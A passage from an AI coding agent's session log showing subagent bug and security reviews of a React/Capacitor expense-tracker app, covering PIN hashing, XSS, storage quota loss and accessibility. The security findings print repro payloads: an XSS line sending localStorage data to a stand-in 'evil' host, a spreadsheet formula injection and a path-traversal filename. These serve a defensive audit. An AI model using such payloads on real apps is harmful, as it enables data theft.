RISK: Weak privacy guarantee for the lock screen in a finance app (also feeds BUG 1's threat model).

---

## P3 — Minor

### BUG 8: QuickActionCenter leaks a click listener when the menu closes before the delayed attach
SEVERITY: P3
FILE: `src/components/QuickActionCenter.jsx:22-31`
FUNCTION: `QuickActionCenter`
DESCRIPTION: The outside-click handler is attached via `setTimeout(..., 100)` but the timeout is never cleared. If `open` becomes `false` within 100 ms (rapid FAB tap, or tap an action immediately), the cleanup `removeEventListener` runs before the listener exists, then the timer attaches the handler permanently. The next effect run with `open=false` returns early with no cleanup, so the stale handler is never removed for the component's lifetime.
ROOT CAUSE: Un-cancelled `setTimeout` + non-idempotent cleanup; the listener identity is captured per-effect but the late-attached listener belongs to a dead closure.
REPRO: Tap the FAB twice quickly (<100 ms) then leave the menu closed; inspect `document` listeners — a `click` handler remains.
EXPECTED: Listener attached synchronously or timeout cleared in cleanup.
ACTUAL: Permanent dangling listener (memory growth, stray `setOpen(false)` calls on later clicks).
RISK: Low, but real listener/memory leak.

### BUG 9: PageErrorBoundary does not reset on same-page navigation
SEVERITY: P3
FILE: `src/components/PageErrorBoundary.jsx:26-31`
FUNCTION: `PageErrorBoundary.componentDidUpdate`
DESCRIPTION: The boundary resets only when `prevProps.page !== this.props.page`. In `App.jsx:219` the rendered div is keyed by `pageKey = currentPage + navParams.editTransaction.id`, but the boundary itself is not remounted and only receives `page`. Navigating from one `category-detail` to another (or re-entering the same page with different params) keeps `page` equal, so a crashed boundary stays crashed and shows the error screen on the new route.
ROOT CAUSE: Reset condition ignores params/key; boundary not keyed in App.jsx:236.
REPRO: Crash `CategoryDetail`, then navigate to a different `category-detail` from a notification deep link.
EXPECTED: Boundary resets whenever the destination/params change.
ACTUAL: Stale error screen blocks the new content.

### BUG 10: Browser/URL back is unsupported and deep links are notification-only
SEVERITY: P3
FILE: `src/App.jsx:185-247` (`handleNavigate` 192-202, `handleGoBack` 204-216)
FUNCTION: `AppContent`
DESCRIPTION: Navigation is purely state-based — no `history.pushState`/`popstate`, no URL sync. The physical back button on desktop browsers and any external deep link (URL) are unhandled; only notification-tap deep links exist (`NotificationTapHandler`, 155-166). Also, while the app is locked, `AppContent` is unmounted, so a notification tap during lock is silently dropped.
ROOT CAUSE: State router without history integration; listener registered only inside the unlocked tree.
REPRO: Open the app in a browser and press Back — the app doesn't navigate; the tab is left. Open a URL like `/debts` — nothing happens.
EXPECTED: Back-button/deep-link support or an explicit documented decision.
ACTUAL: No handling for either.
RISK: Desktop/low-vision users with keyboard-only habits and PWA deep links are broken.

### BUG 11: Touch targets and focus semantics in BottomNav
SEVERITY: P3
FILE: `src/components/BottomNav.jsx:17-35, 38-66`
FUNCTION: `BottomNav`
DESCRIPTION: (a) Arrow-key handling on the `<nav>` fires `onNavigate` but never moves focus — after ArrowRight the page changes while focus stays on the old (now inactive) tab; the ARIA `tablist`/`tab` contract (roving tabindex, `aria-controls`) is not implemented, and these are page navigations, not tabs. (b) `handleKeyDown` is attached to the whole nav, so arrows from any child bubble into navigation.
ROOT CAUSE: Keydown handler without focus management; semantic mismatch.
REPRO: Tab to a nav item, press ArrowRight — page changes, focus ring stays on the previous item.
EXPECTED: Focus moves to the newly active tab; tab semantics match behavior.
ACTUAL: Keyboard focus is stale; screen readers are told "tab" for a route change.
RISK: Confusion for keyboard/screen-reader users on the app's primary navigation.

### BUG 12: ScrollRestoration restores stale scroll on forward navigation and races lazy content
SEVERITY: P3
FILE: `src/components/ScrollRestoration.jsx:8-15, 17-23`
FUNCTION: `ScrollRestoration`
DESCRIPTION: Positions are stored per `pageKey` in a module map and restored on any re-visit. `App.jsx:201` already scrolls to top on forward navigation, then this effect scrolls back to the saved offset — so navigating *forward* to a previously visited page lands mid-page instead of at top. The `requestAnimationFrame` restore also races lazy-loaded content, restoring before content layout completes.
ROOT CAUSE: No distinction between back-restore vs forward-scroll-top; restore timing not tied to content mount.
REPRO: Scroll to row 20 on History, go to Settings, then navigate back to History via the bottom tab → History opens at row 20, not top.
EXPECTED: Forward navigation to top; only back navigation restores.
ACTUAL: Wrong scroll position on forward revisits.
RISK: Disorientation for low-vision users; missing content above the fold.

### BUG 13: `DebtCard` overdue comparison uses local `new Date()` against UTC-parsed date-only strings
SEVERITY: P3
FILE: `src/components/DebtCard.jsx:10`
FUNCTION: `DebtCard`
DESCRIPTION: `new Date(debt.dueDate) < new Date()` — a `dueDate` like `"2025-08-01"` parses as **UTC midnight**. In UTC+ timezones the card reports the debt overdue from 00:00 local of the due day (or a day early/late in UTC- timezones), diverging from the date shown.
ROOT CAUSE: Implicit UTC parsing of date-only strings compared against local time.
REPRO: Due date = today (any IST/UTC+ region, before 05:30 local on the due day... i.e., between 00:00 and 05:29 IST) — card shows "Overdue".
EXPECTED: Compare using the same date convention as `formatDate`.
ACTUAL: Inconsistent overdue badge vs displayed date.

### BUG 14: PinLockScreen keyboard input is broken; Enter-only handling
SEVERITY: P3
FILE: `src/components/PinLockScreen.jsx:19, 22-31, 125-132`
FUNCTION: `PinLockScreen`
DESCRIPTION: `inputRef.current?.focus()` is dead code — there is no `<input>` in the JSX (the PIN dots are plain divs), and no hidden input collects keypresses. Only `Enter` is handled on `document`; typing digits on a physical keyboard does nothing, so desktop/keyboard-first low-vision users must click the on-screen buttons (which works but is unexpected). Dots are `div`s with no `aria-live`/labels, so the PIN length isn't announced.
ROOT CAUSE: Input-based design abandoned for buttons; leftover ref, no keyboard digit capture.
REPRO: Focus the lock screen on desktop and type `1234` — nothing is entered; only Enter (with 0 digits) is registered.
EXPECTED: Digits typed on hardware keyboard populate the PIN.
ACTUAL: Dead input ref; PIN entry impossible via hardware keyboard.
RISK: Accessibility gap for keyboard-only users; also `document`-level Enter can fire against the wrong target if any other key event hits.

### BUG 15: PinLockScreen double-submit inflates fail counter; cooldown restarts on language change
SEVERITY: P3
FILE: `src/components/PinLockScreen.jsx:99-123, 22-31`
FUNCTION: `handleUnlock` / mount effect
DESCRIPTION: `handleUnlock` is async and has no in-flight guard; double-tapping Unlock fires two `verifyPin` calls — on a wrong PIN each call increments `failCount`, so the 5-fail cooldown / 10-fail lockout can be reached in half the intended attempts. Separately, the mount effect has deps `[t]`: if the language changes while the lock screen is up, it re-reads the fail state and calls `startCooldown` again, restarting the countdown timer.
ROOT CAUSE: No pending/submit guard; effect re-run on `t`.
REPRO: Enter wrong PIN, double-tap Unlock twice → cooldown triggers after 3 actual wrong entries.
EXPECTED: One verification per submit; cooldown state keyed to storage, not to `t`.
ACTUAL: Premature lockout; countdown reset on i18n change.
RISK: Legitimate users locked out faster; time-based cooldown is inaccurate.

### BUG 16: Toast timers aren't cleared on provider unmount (unmounted setState)
SEVERITY: P3
FILE: `src/components/Toast.jsx:97-105`
FUNCTION: `addToast` / `ToastProvider`
DESCRIPTION: `setTimeout` for auto-dismiss is stored in `timersRef` but there is no unmount cleanup effect; if `ToastProvider` unmounts with pending toasts, the timers fire `setToasts`/`removeToast` after unmount (no-op in React 18, but a leak). Each live toast also drives a 50 ms progress interval (`ToastItem`, 26-35) causing 20 re-renders/sec/toast.
ROOT CAUSE: Missing cleanup on unmount; interval-based progress bar.
REPRO: Navigate between app trees that tear down the provider while a toast is showing.
EXPECTED: Timers/intervals cancelled on unmount.
ACTUAL: Orphaned timers; avoidable repaints.
RISK: Low; battery/CPU waste on long-lived toasts.

### BUG 17: Hardcoded English strings bypass i18n (low-vision/multilingual users)
SEVERITY: P3
FILE: `src/components/TransactionItem.jsx:89,98`; `src/components/Toast.jsx:53,60,69`; `src/components/SkeletonLoader.jsx:63,69`; `src/components/QuickActions.jsx:24`; `src/components/RelatedItemsPanel.jsx:162`; `src/components/BrandHeader.jsx:27,38-42`
FUNCTION: Various
DESCRIPTION: A11y/UX strings are hardcoded in English and never translated: `aria-label="Edit transaction"`, `aria-label="Delete transaction"`, `"Action"` fallback, `aria-label="Undo"`, `aria-label="Close"`, `"Loading..."` + `aria-label="Loading"`, `` aria-label={`Open ${action.label}`} ``, `title="Unlink"`, and the brand tagline `TRACK SMARTER`. Screen readers announce these in English regardless of the active language (ta/hi/te/kn).
ROOT CAUSE: Literals instead of `t()` keys.
REPRO: Switch to Tamil, open History — screen reader announces "Edit transaction"/"Delete transaction" in English.
EXPECTED: Localized labels via translation keys.
ACTUAL: Mixed-language announcements.
RISK: Real accessibility defect for the stated low-vision/multilingual audience.

### BUG 18: i18n mixing — direct `i18n.t` callers don't re-render on language switch
SEVERITY: P3
FILE: `src/i18n/index.jsx:60-80` interacting with `src/components/ErrorBoundary.jsx:71-104`, `src/components/PageErrorBoundary.jsx:44-51`, `src/components/EmptyState.jsx:3,59-92`
FUNCTION: `I18nProvider` / class boundaries / `getEmptyStateConfig`
DESCRIPTION: Components consuming the context re-render on language change, but class components and helpers calling `i18n.t(...)` directly (ErrorBoundary, PageErrorBoundary, `getEmptyStateConfig`) don't subscribe — a language switch while an error screen (or empty-state config) is displayed leaves those texts in the old language until some other re-render.
ROOT CAUSE: Two t-sources with different reactivity; class components bypass context.
REPRO: Trigger an error screen, switch language in another flow → error screen text unchanged.
EXPECTED: All UI reflects the new language.
ACTUAL: Mixed-language UI on error/empty states.

### BUG 19: Modals/focus trap don't inert the background
SEVERITY: P3
FILE: `src/components/Modal.jsx:61-83`, `src/components/ConfirmationModal.jsx:76-84`
FUNCTION: `Modal` / `ConfirmationModal`
DESCRIPTION: `role="dialog" aria-modal="true"` is set, but the background content is not made `inert`/`aria-hidden`. The Tab-trap wraps within the dialog, yet a screen-reader user can still explore the background DOM; focus can also be programmatically pulled out. `aria-describedby="confirm-desc"` points at a non-existent element when `description` is empty (ConfirmationModal.jsx:96).
ROOT CAUSE: Manual trap without background inerting; optional describedby id.
REPRO: Open any modal, use a screen reader — background list items are still announced.
EXPECTED: Background excluded from the accessibility tree while a modal is open.
ACTUAL: Modal state not fully isolated.

### BUG 20: Secret-tap handler on a plain `div` — not keyboard accessible
SEVERITY: P3
FILE: `src/components/BrandHeader.jsx:25`
FUNCTION: `handleLogoPress`
DESCRIPTION: The logo (which gates access to the Diagnostics page) is a `<div onClick>` with no `role`, `tabIndex`, key handling, or label. Keyboard-only users can never reach Diagnostics.
ROOT CAUSE: Mouse-only click on a non-interactive element.
REPRO: Try to open Diagnostics with a keyboard — impossible.
EXPECTED: A button with an accessible name (or a documented alternative).
ACTUAL: Hidden, mouse-only route.
RISK: A11y gap; also a hidden feature discoverability issue.

### BUG 21: Small touch targets
SEVERITY: P3
FILE: `src/components/NotificationBanner.jsx:26` (`min-w/h-[24px]`), `src/components/Modal.jsx:76` (`min-w/h-[32px]`), `src/components/DebtCard.jsx:65-70`, `src/components/TransactionItem.jsx:86-100` (p-1.5 ≈ 24-26 px), `src/components/RelatedItemsPanel.jsx:159-165` (p-1)
FUNCTION: Various dismiss/action buttons
DESCRIPTION: Multiple dismiss/expand/action buttons are well under the 44 px (Android) / 44x44 (WCAG 2.2 2.5.8) minimum recommended target for the mobile audience.
ROOT CAUSE: Icon buttons sized to the icon + small padding.
REPRO: Tap dismiss X on a banner on a phone — frequently misses.
EXPECTED: ≥44×44 px touch targets.
ACTUAL: Sub-44 px targets on primary actions.
RISK: Miss-taps for low-vision/motor-impaired users.

### BUG 22: FinancialScore uses array indexes as keys for factors
SEVERITY: P3
FILE: `src/components/FinancialScore.jsx:94`
FUNCTION: `FinancialScore`
DESCRIPTION: `factors.map((f, i) => <div key={i} ...>)` — if factor order/content shifts between score updates, React reconciles by index and can re-render/overlay stale factor text/colors.
ROOT CAUSE: Index keys for a dynamic list.
REPRO: Score recalculation reorders factors → mismatched icon/color/text pairing for a render.
EXPECTED: Stable keys (factor id/text).
ACTUAL: Unstable reconciliation.
RISK: Transient visual inconsistency on a health-score card.

### BUG 23: App.jsx — `window.scrollTo({ behavior: 'instant' })` is non-standard
SEVERITY: P3
FILE: `src/App.jsx:201`
FUNCTION: `handleNavigate`
DESCRIPTION: `behavior: 'instant'` is not in the CSSOM spec (`auto`/`smooth` only); some engines ignore the option and fall back to default (which is fine) while others may warn. Works today but is a portability smell; also conflicts with `ScrollRestoration` (BUG 12).
EXPECTED: `behavior: 'auto'` or omit.
ACTUAL: Non-standard enum.
RISK: Minor.

---

## Not-a-bug notes (verified, so not reported)
- `ErrorBoundary.handleResetData` collects keys **first**, then removes — there is no delete-during-iteration skip (the classic bug is absent here).
- `App.jsx` `handleNavigate`/`handleGoBack` stale closures are guarded by `useCallback([history])` + refs in `AndroidBackHandler`; no stale-closure navigation bug found.
- `ReminderInit`, `NotificationTapHandler` correctly use refs/stable `onNavigate`; no missing-dep/infinite-loop issue.
- `ConfirmationModal`/`Modal` focus-trap Tab logic is internally correct for the dialog itself; no focus-escape bug beyond the inert issue (BUG 19).
- Toast auto-dismiss timers are correctly cleared on per-toast removal (`removeToast`); only unmount cleanup is missing (BUG 16).
- `privacy.shouldLockOnResume` order (`locked` check before `suppressLock`) correctly prevents the suppress-flag bypass.

**Summary:** 1 P1 (PIN-bypass via malformed data), 6 P2, 16 P3. The most impactful issues for the stated user base (mobile, low-vision) are BUG 1 (lock bypass), BUG 5 (invisible actions on touch), BUG 3 (scroll-lock leak), BUG 4 (stale relationship UI), and BUG 17/18 (i18n + a11y labels).
</task_result>
</task>
```

**Tool: task**

**Input:**
```json
{
  "description": "Review security backup export utils",
  "prompt": "You are performing a production-grade SECURITY review (RESEARCH ONLY - do not modify files) of a financial expense-tracker app at \"E:\\Siva Current Work Backup File\\shyblack\\shyBlackMoneyTracker\\shyblack\\src\\utils\".\n\nReview these files ONLY (read each one completely):\nsafeStorage.js, storageAdapter.js, security.js, biometrics.js, backup.js, backupManager.js, snapshotRecovery.js, documents.js, receiptParser.js, receiptUtils.js, downloadUtils.js, exports.js, pdfExport.js, pdfReport.js, notifications.js, reminders.js, emiNotifications.js, budgetNotifications.js, schema.js, performance.js, performanceAudit.js, lazyImport.js, responsive.js, haptics.js, dailyTip.js, wealthUtils.js, recurring.js.\n\nAlso check: src\\main.jsx, src\\index.css (only skim for dangerous styles/global issues).\n\nLook for:\n1. SECURITY: PIN/biometric handling weaknesses, plaintext sensitive data in localStorage, WebView vulnerabilities, unsafe crypto usage (weak algorithms, hardcoded keys), lack of WebView hostname verification, clickjacking, insecure http usage, secrets hardcoded in code, unsafe deserialization, XSS via dangerouslySetInnerHTML or document.write, prototype pollution, file path traversal in backup/restore, zip-slip in backups, exposure of financial data in exports/PDF/share, notification data leakage on lock screen\n2. DATA LOSS: backup/restore corruption, partial writes, no atomicity, wrong snapshot ordering, data overwrites, timestamp collisions, quota exhaustion\n3. Crypto: weak KDF (single SHA-256 without iterations for PIN/backup encryption), ECB mode, non-random IV reuse, hardcoded salt/key\n4. Storage: localStorage quota limits (5MB), memory cache consistency issues between safeStorage cache and adapter\n5. Logic bugs in backup chain, snapshot rotation, auto-recovery\n\nBe ACCURATE and VERIFY each finding against actual code. Do NOT fabricate. For each genuine issue, report EXACTLY:\n\nBUG: <short title>\nSEVERITY: P0|P1|P2|P3\nCATEGORY: security|data-loss|logic\nFILE: <path>:<line numbers>\nFUNCTION: <function name>\nDESCRIPTION: <what is wrong>\nROOT CAUSE: <why>\nREPRO: <how to trigger>\nEXPECTED: <correct behavior>\nACTUAL: <current behavior>\nRISK: <impact>\n\nRead every file fully. Do not stop early. Return ALL findings.",
  "subagent_type": "general"
}
```

**Output:**
```
<task id="ses_043e67284ffeMDIjip7UCUFT9c" state="completed">
<task_result>
Review complete. I read every specified file in full plus `privacy.js` (which owns the actual PIN handling), `FinanceContext.jsx`, `Settings.jsx`, `DocumentVaultPage.jsx`, and `capacitor.config.json` to verify cross-references. Verified findings below, ordered by severity.

---

## P1 — Critical

### BUG: PIN hash uses single unsalted-iteration SHA-256 (no KDF), trivially brute-forceable
**SEVERITY:** P1
**CATEGORY:** security
**FILE:** `shyblack/src/utils/privacy.js:48-52` (used by `setPin:62-67`, `verifyPin:69-105`)
**FUNCTION:** `computeHash`
**DESCRIPTION:** The PIN is hashed as `SHA-256(salt + pin)` with a single digest call — no PBKDF2/bcrypt/scrypt, no iteration count. PINs are typically 4–6 digits (~10⁴–10⁶ candidates), so an offline attacker can recover the PIN from `pinHash`/`pinSalt` in milliseconds with a GPU.
**ROOT CAUSE:** `crypto.subtle.digest('SHA-256', ...)` used directly instead of `PBKDF2` (which the codebase already uses correctly for backup encryption in `backup.js:268-278`, 100k iterations).
**REPRO:** Extract `shyblack_finora_privacy` from the app's WebView storage (root, adb backup, or forensic copy of the data partition) and run a dictionary/space-exhaustion attack over `SHA-256(salt+pin)`.
**EXPECTED:** Derive the PIN key with PBKDF2 (≥100k iterations) with a random per-PIN salt, like the backup crypto already does.
**ACTUAL:** Single SHA-256; the in-memory `failCount`/`cooldownUntil` throttles only live on-device attempts and does nothing for offline cracking.
**RISK:** The app's primary security control (PIN gate) is effectively a password-equivalent to a fast hash; anyone with a copy of the on-device data can unlock the whole financial dataset.

---

## P2 — High

### BUG: Stored XSS in app origin via printed monthly statement (`iframe.srcdoc` / `document.write`)
**SEVERITY:** P2
**CATEGORY:** security
**FILE:** `shyblack/src/utils/pdfExport.js:83-91` (debt rows), `:228-250` (`printStatement`); `:200-225` (`buildHtml` emits raw HTML)
**FUNCTION:** `buildHtml`, `printStatement`
**DESCRIPTION:** Debt `personName` and raw category ids are interpolated into an HTML string without escaping (`<td>${d.personName}</td>` line 87). `printStatement` then injects that HTML into a same-origin context: `iframe.srcdoc = html` (line 232) and fallback `win.document.write(html)` (line 242). Because `srcdoc`/`document.write` inherit the parent origin, a payload in `personName` executes JavaScript with full access to the app's origin (all localStorage, the app's API surface).
**ROOT CAUSE:** No HTML escaping of user-controlled fields before string-template HTML generation; `srcdoc`/`document.write` used for the "safe" print path.
**REPRO:** Craft a backup whose debt entry has `personName = "<img src=x onerror='fetch(\"https://evil/?d=\"+localStorage.getItem(\"shyblack_transactions\")+...'>"`; restore it; open any month's Statement and tap Print.
**EXPECTED:** Escape all user data in generated HTML (`&lt;`/`&amp;`/`&quot;`), or render through a sanitizer before injection.
**ACTUAL:** Raw user strings executed in the app origin.
**RISK:** Full financial data exfiltration triggered by a malicious restore/import; also self-XSS via a crafted debt name.

### BUG: safeStorage memory cache poisoned when adapter write fails (quota) — silent data loss
**SEVERITY:** P2
**CATEGORY:** data-loss
**FILE:** `shyblack/src/utils/safeStorage.js:77-84` (`set`); interacts with `storageAdapter.js:42-58`, `:126-164`
**FUNCTION:** `safeStorage.set`
**DESCRIPTION:** `set()` writes `memoryCache.set(key, value)` **before** calling `adapter.set()`. When the adapter fails (returns `false` from `_handleQuotaError`, or any other error), the cache already holds the new value and is never invalidated. Subsequent `get()` returns the phantom value, so every caller (including the debounced transaction persister in `FinanceContext.jsx:174-183` and the unmount flush at `:186-197`) believes the write succeeded. On reload the data reverts to the last truly-persisted value — the user's most recent transactions silently disappear.
**ROOT CAUSE:** Cache write not transactional with the storage write; no rollback of the cache entry when `adapter.set` returns `false` (it returns `false`, it does not throw, so the outer `try/catch` never runs).
**REPRO:** Fill localStorage near the 5 MB quota (10 in-app backup generations each hold a full dataset — see next finding — plus document/receipt blobs), add a transaction, reload.
**EXPECTED:** On adapter failure, evict the cache entry and surface the failure; never report success to callers.
**ACTUAL:** Cache and storage diverge; UI shows the transaction, storage never persisted it.
**RISK:** Silent, unrecoverable loss of newest financial records exactly when storage pressure is highest.

### BUG: Financial data (and up to 10 full plaintext backup generations) stored unencrypted in localStorage
**SEVERITY:** P2
**CATEGORY:** security
**FILE:** `shyblack/src/utils/backup.js:110-133` (`createBackupRecord` sets `encrypted:false` and stores full `data`); `shyblack/src/utils/documents.js:72-78`; `shyblack/src/utils/receiptUtils.js:17-18,31`
**FUNCTION:** `createBackupRecord`, `createDocument`, `createReceipt`
**DESCRIPTION:** Every in-app backup generation stores the complete transaction/debt/budget/EMI dataset as plaintext JSON under `shyblack_backups` (10 generations → up to ~10× dataset size). Document files and receipt scan images are stored as full base64 blobs in `shyblack_document_files` / `shyblack_receipt_scans`. None of this is encrypted at rest; the backup encryption path (`exportEncryptedBackup`) is only for user-initiated exports. Anyone with filesystem/root access to the app data can read all financial history, scans, and attached documents.
**ROOT CAUSE:** localStorage is the only persistence layer; backups, document blobs and receipt images are serialized into it in plaintext.
**REPRO:** adb/root access → dump WebView localStorage → open `shyblack_transactions`, `shyblack_backups`, `shyblack_document_files`.
**EXPECTED:** Sensitive modules encrypted at rest (or backed by the platform secure store), documents/receipts in app-private storage rather than localStorage.
**ACTUAL:** Plaintext financial data, full history duplicates, and raw document/receipt images in localStorage.
**RISK:** Financial-data disclosure; also the primary driver of the quota-exhaustion data-loss path above (each backup generation re-copies the whole dataset).

### BUG: Notification channel is PUBLIC; rupee amounts and debtor names leak on the lock screen
**SEVERITY:** P2
**CATEGORY:** security
**FILE:** `shyblack/src/utils/notifications.js:105` (`visibility: 1`); bodies in `shyblack/src/utils/reminders.js:121-124,172-191,224-250`; `shyblack/src/utils/emiNotifications.js:57-63`; `shyblack/src/utils/budgetNotifications.js:54-56`
**FUNCTION:** `initializeNotificationChannel`, `sendNotification`
**DESCRIPTION:** The notification channel is created with `visibility: 1` (PUBLIC), and notification bodies include `Spent ₹X`, `₹A due from <personName> tomorrow`, `Overdue: <billName> - ₹X`, EMI amounts, and budget overspend figures. On Android the content is shown on the lock screen while the app itself is PIN/biometric-locked — undermining the app's core privacy promise.
**ROOT CAUSE:** Channel visibility set to PUBLIC and no consideration of lock-state before scheduling content-bearing notifications.
**REPRO:** Enable PIN lock + daily/monthly/debt/EMI reminders, lock the device, observe the lock screen.
**EXPECTED:** Use `visibility: -1` (SECRET) or `visibility: 0`/no-content redaction for financial notifications, or honor the PIN-locked state.
**ACTUAL:** Lock-screen display of amounts and people's names.
**RISK:** Financial privacy disclosure to anyone glancing at the device.

### BUG: Quota-error handler silently deletes user data (achievements, streak, budget alert log, pending archive)
**SEVERITY:** P2
**CATEGORY:** data-loss
**FILE:** `shyblack/src/utils/storageAdapter.js:126-164` (`_handleQuotaError`), purge list at `:129-135`
**FUNCTION:** `_handleQuotaError`
**DESCRIPTION:** On any `QuotaExceededError`, the adapter silently `removeItem`s `search_idx`, `budget_notif`, `streak`, `achievements`, and `archive_pending` to make room. `streak`/`achievements` are user progress, and `archive_pending` can hold transactions awaiting archival commit — these are not safely "rebuildable cache". There is no user notification and no recovery.
**ROOT CAUSE:** Purge performed implicitly inside the storage write path with an assumption the listed keys are disposable.
**REPRO:** Push storage near quota; the next `safeStorage.set` triggers deletion of these keys.
**EXPECTED:** Surface quota state to the user; never delete user-visible progress data as a side effect of a write.
**ACTUAL:** Silent, permanent loss of streaks/achievements and possibly pending archive data.
**RISK:** Unannounced user-data loss during normal operation.

---

## P3 — Medium/Low

### BUG: XSS in exported HTML report (transaction note / raw category interpolated unescaped)
**SEVERITY:** P3
**CATEGORY:** security
**FILE:** `shyblack/src/utils/exports.js:276-284` (transaction rows), builder `:200-296`
**FUNCTION:** `exportWithChartsToHTML`
**DESCRIPTION:** `t.note.substring(0,30)` (line 281) and `cat?.label || t.category` (line 280) are injected into the HTML template without escaping. A note like `<img src=x onerror=...>` (29 chars, fits the 30-char truncation) or a crafted imported category id executes when the exported `.html` is opened.
**ROOT CAUSE:** String-template HTML without output encoding.
**REPRO:** Create a transaction with a 30-char HTML payload note, export the HTML report, open it.
**EXPECTED:** Escape all dynamic values in generated HTML.
**ACTUAL:** Script executes in the exported file.
**RISK:** When the report is shared, the recipient's machine executes attacker-controlled script (phishing/credential theft).

### BUG: CSV/spreadsheet formula injection (Excel)
**SEVERITY:** P3
**CATEGORY:** security
**FILE:** `shyblack/src/utils/exports.js:16-22` (`toCsvValue`); xlsx cells `:301-303`
**FUNCTION:** `toCsvValue`, `xlsxCell`
**DESCRIPTION:** Cell values beginning with `=`, `+`, `-`, `@` are not neutralized. A transaction note/debt person like `=HYPERLINK("http://evil","Click")` or `=cmd|...` executes as a formula when the CSV/XLSX is opened in Excel.
**ROOT CAUSE:** CSV/XML generation only handles delimiters/quotes, not spreadsheet-formula metacharacters.
**REPRO:** Import a CSV/backup with `personName = "=2+5"` and open the exported CSV.
**EXPECTED:** Prefix formula metacharacters (e.g., `'`) in exported cells.
**ACTUAL:** Excel evaluates the injected formula.
**RISK:** Spreadsheet formula injection (macro/URL exfiltration) against anyone opening the export.

### BUG: Filesystem path traversal via user-controlled document filename
**SEVERITY:** P3
**CATEGORY:** security
**FILE:** `shyblack/src/utils/downloadUtils.js:144-149` (`downloadBlob`), `:200-205` (`downloadDataUri`), `:307-312` (`shareBlob`); caller `shyblack/src/pages/DocumentVaultPage.jsx:257,272,317`
**FUNCTION:** `downloadBlob`, `downloadDataUri`, `shareBlob`
**DESCRIPTION:** `filename` is taken from `doc.fileName` (user-controlled, and settable via restored backups). It is concatenated into `${EXPORT_DIR}/${filename}` and passed to `Filesystem.writeFile` with no sanitization. A filename of `../../..//sdcard/foo` escapes the `ExpenseTracker` directory (Capacitor Filesystem resolves `..`).
**ROOT CAUSE:** Filenames concatenated into paths without validation (no basename enforcement, no `..`/separator stripping).
**REPRO:** Restore a backup containing a document with `fileName: "../../Android/data/com.shyblack.finance/files/evil"` and download it.
**EXPECTED:** Sanitize filename to a basename (strip `/`, `\`, `..`).
**ACTUAL:** Arbitrary write outside the intended directory.
**RISK:** Defensive low; write-anywhere on the device via crafted import.

### BUG: Unbounded snapshot chain (MAX_SNAPSHOTS = 0) grows storage; recovery snapshot truncates data to 200 transactions
**SEVERITY:** P3
**CATEGORY:** data-loss
**FILE:** `shyblack/src/utils/snapshotRecovery.js:4,27` (`MAX_SNAPSHOTS = 0`, `pruneSnapshots` no count limit), `:43-61` (`saveSnapshot` slices to 200, line 49), `:63-69`
**FUNCTION:** `pruneSnapshots`, `saveSnapshot`, `findLatestValidSnapshot`
**DESCRIPTION:** Every debounced transaction persist and every background flush calls `saveSnapshot`. With `MAX_SNAPSHOTS = 0` only age (30 days) prunes, so an active user can accumulate hundreds of snapshots, each up to 200 transactions — a large, hidden quota consumer. Separately, snapshots beyond 200 transactions are truncated, so `findLatestValidSnapshot`-based recovery restores only 200 transactions even if `totalTransactionCount` was higher.
**ROOT CAUSE:** Disabled count cap; truncation instead of chunked/compressed snapshots.
**REPRO:** Enter transactions continuously for days, inspect `shyblack_snapshot_chain`; or exceed 200 tx, corrupt main storage, observe recovery restores only 200.
**EXPECTED:** Bound the chain size and/or dedupe snapshots; preserve full transaction set for recovery.
**ACTUAL:** Unbounded growth and lossy recovery.
**RISK:** Quota pressure (feeds P2 data-loss path) and incomplete recovery after corruption.

### BUG: Backup restore is non-atomic (partial overwrite on crash mid-restore)
**SEVERITY:** P3
**CATEGORY:** data-loss
**FILE:** `shyblack/src/utils/backup.js:174-212` (`restoreSelectedModules`), `:836-872` (`restoreFromBackup`)
**FUNCTION:** `restoreSelectedModules`, `restoreFromBackup`
**DESCRIPTION:** Restore writes modules one key at a time with no transaction/commit marker. If the app is killed or quota fails mid-loop, some modules reflect the backup and others the pre-restore state (a mixed dataset). The pre-restore snapshot (`backupManager.js:155`) mitigates but is itself one more unchecked write.
**ROOT CAUSE:** Per-key writes without atomicity or a staged commit (write-temp → verify → swap).
**REPRO:** Restore a large backup and force-kill the app mid-restore.
**EXPECTED:** Stage the whole dataset, verify, then swap in one logical operation (or journal).
**ACTUAL:** Mixed/stale dataset after interrupted restore.
**RISK:** Inconsistent financial records after a crash.

### BUG: EMI notification IDs can collide via hash of emiId — reminders silently replace each other
**SEVERITY:** P3
**CATEGORY:** logic
**FILE:** `shyblack/src/utils/emiNotifications.js:8-20` (`getNotificationIds`, hash mod 350), `:68-71` (`cancelEmiNotifications`), `:73-85` (`rescheduleAllEmiNotifications`)
**FUNCTION:** `getNotificationIds`, `cancelEmiNotifications`, `rescheduleAllEmiNotifications`
**DESCRIPTION:** Notification IDs are `600000 + (hash(emiId) % 350) * 5 + i`. Two EMIs whose ids hash to the same bucket share the same 5 slots. `rescheduleAllEmiNotifications` cancels all and re-schedules, so the later EMI silently overwrites the earlier one's reminders; `cancelEmiNotifications(A)` cancels EMI B's reminders too.
**ROOT CAUSE:** Fixed small ID space (1750 slots) hashed from an unbounded id set, with no collision handling.
**REPRO:** Create ~350+ EMIs (or two that collide) and reschedule.
**EXPECTED:** Collision-resistant IDs (counter/UUID-based) or explicit rescheduling of each EMI's own slots.
**ACTUAL:** Lost/overwritten EMI reminders.
**RISK:** Missed EMI payment reminders.

### BUG: `getSafeWindowOpen` creates an unsandboxed, same-origin iframe for an arbitrary URL (dead code, but exported)
**SEVERITY:** P3
**CATEGORY:** security
**FILE:** `shyblack/src/utils/downloadUtils.js:374-389`
**FUNCTION:** `getSafeWindowOpen`
**DESCRIPTION:** `iframe.src = url` with no `sandbox` attribute. An `about:blank`/`javascript:` URL executes script in the app origin (privileged localStorage access). Currently unreferenced in `src`, so latent — but exported and one refactor away from handling untrusted URLs (e.g., receipt/document URLs).
**ROOT CAUSE:** No origin/scheme allowlist and no sandboxing on the dynamically created iframe.
**REPRO:** (Latent) Call `getSafeWindowOpen('javascript:fetch(...)')`.
**EXPECTED:** Restrict to `https:` URLs, add `sandbox`/`referrerpolicy`, or remove the dead code.
**ACTUAL:** Unsandboxed iframe that can execute script in the app origin.
**RISK:** Arbitrary code execution in-app if ever wired to untrusted input.

### BUG: Backup export filename uses `Date.now()` — same-ms collisions overwrite; rotation sort unstable on equal timestamps
**SEVERITY:** P3
**CATEGORY:** data-loss
**FILE:** `shyblack/src/utils/backup.js:518-522` (`getExportFilename`); `:32-35` (`rotateBackups`)
**FUNCTION:** `getExportFilename`, `rotateBackups`
